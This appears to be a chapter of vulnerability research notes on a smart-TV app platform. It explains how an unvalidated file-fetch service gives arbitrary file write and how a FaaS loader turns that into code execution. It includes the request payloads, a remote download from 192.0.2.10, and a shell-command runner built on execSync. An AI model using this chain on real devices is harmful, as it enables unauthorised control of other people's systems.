# 02 — arbitrary write and code execution

Both primitives run in the app context (uid 314). Neither needs a permission
grant.

## Write: the `fetcher` FaaS function

`services/fetcher/package.json` declares `"permission": {}` and
`selfStart: false`. It is not in the three-segment router whitelist
(`/service/fetcher` answers `Wrong request`), but the four-segment route works:
`/service/basic/fetcher`.

Start it once over WebSocket:

```json
{"path":"phoenix://service/basic/fetcher","method":"start",
 "parameters":{},"session":901,"timeout":10}
```

Then write a file:

```js
vowOS.service.syncExecute("basic/fetcher", {api:"fetchFile", args: JSON.stringify({
    url:       "http://192.0.2.10:9000/pub/payload.bin",
    directory: "/APPS/some/target.bin",
    permission: 420
})});
```

Implementation (`functions/fetch/fetchfile.js`):

```js
const directory  = args?.directory          // no validation at all
const permission = args?.permission ?? 0
axios.get(url, ...).then(response => {
    const file = fs.createWriteStream(directory, file_options)
    ...
    fs.chmodSync(directory, permission)     // when 1 <= permission <= 0o777
})
```

Limits that matter:

- **Parent directories must exist.** `createWriteStream` does not create them.
  Writes into an existing directory (for example
  `.../CHA/functions/fetch/`) work; a new directory fails with `ENOENT`.
- The function follows symlinks, exactly like `open(2)`.
- It writes as uid 314, so it cannot leave the writable set from
  [`01-system.md`](01-system.md).

## Execution: FaaS function injection

`lib/middleware/getFunctionReqInfo.js` maps a request to
`/function/<type>/<module>/<func>` and sets `sid = /<module>/<func>`. The FaaS
worker then does:

```js
const safePath = path.join(base_dir, 'functions', cmd.sid)
const func = require(safePath)
```

So a JavaScript file written to
`/APPS/pkgs/tv.vidaa.jsservice.<type>/current/functions/<module>/<func>.js`
runs in the FaaS worker process (uid 314) when you POST to
`https://localhost:9888/function/<type>/<module>/<func>`.

Notes from testing:

- `require()` caches modules. For a new version, use a **new filename**.
- The HTTPS server has `requestTimeout: 5000`. A longer function can run, but
  the response is cut off. Read the result from a file instead.
- The worker is a normal Node process: `child_process` works, and executing a
  binary placed in `/APPS` works (verified, SELinux allows it).

Example function used during the run:

```js
'use strict';
const fs = require('fs');
const { execSync } = require('child_process');
module.exports = async function (args) {
    const res = { result: true, out: '' };
    try {
        if (args && args.cmd) {
            res.out = execSync(args.cmd, { timeout: 8000, encoding: 'utf8',
                                           shell: '/bin/bash' });
        }
    } catch (e) {
        res.result = false;
        res.out = String((e.stdout || '') + (e.stderr || ''));
    }
    fs.writeFileSync('/tmp/run_last.json', JSON.stringify(res));
    return res;
};
```

Write it to `.../functions/fetch/run.js`, then:

```js
var x = new XMLHttpRequest();
x.open("POST", "https://localhost:9888/function/basic/fetch/run", false);
x.setRequestHeader("identifier", "");
x.send(JSON.stringify({cmd: "id; uname -m"}));
```

`id` and `uname` are not installed on this userland; use `/proc` instead.
